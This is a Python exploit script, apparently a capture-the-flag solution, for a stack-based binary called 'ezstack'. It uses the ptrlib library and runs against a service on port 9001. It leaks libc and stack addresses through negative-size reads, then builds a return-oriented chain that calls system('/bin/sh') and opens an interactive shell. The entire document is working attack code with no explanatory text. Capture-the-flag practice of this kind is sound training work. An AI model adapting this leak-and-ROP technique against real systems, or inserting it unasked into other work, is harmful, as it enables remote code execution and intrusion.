from ptrlib import *

def push(data):
    sock.sendlineafter("> ", "1")
    sock.sendafter("data: ", data)
    return

def pop(size):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("size: ", str(size))
    sock.recvuntil("[+] ")
    return sock.recvline()

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("../distfiles/ezstack")
#sock = Process("../distfiles/ezstack")
sock = Socket("0.0.0.0", 9001)

rop_pop_rdi = 0x0002155f
rop_ret = 0x000008aa

# leak libc base
libc_base = u64(pop(-0x130)) - libc.symbol("__libc_start_main") - 231
logger.info("libc base = " + hex(libc_base))
pop(0x130)

# leak stack base and set the least byte to 0x00
stack_base = u64(pop(-0x108)) - 0x128
logger.info("stack base = " + hex(stack_base))
pop(0x108)

# set rop chain
payload = p64(libc_base + rop_ret) * (0x100 // 8 - 3)
payload += p64(libc_base + rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
push(payload)

# get the shell
sock.sendlineafter("> ", "3")

sock.interactive()
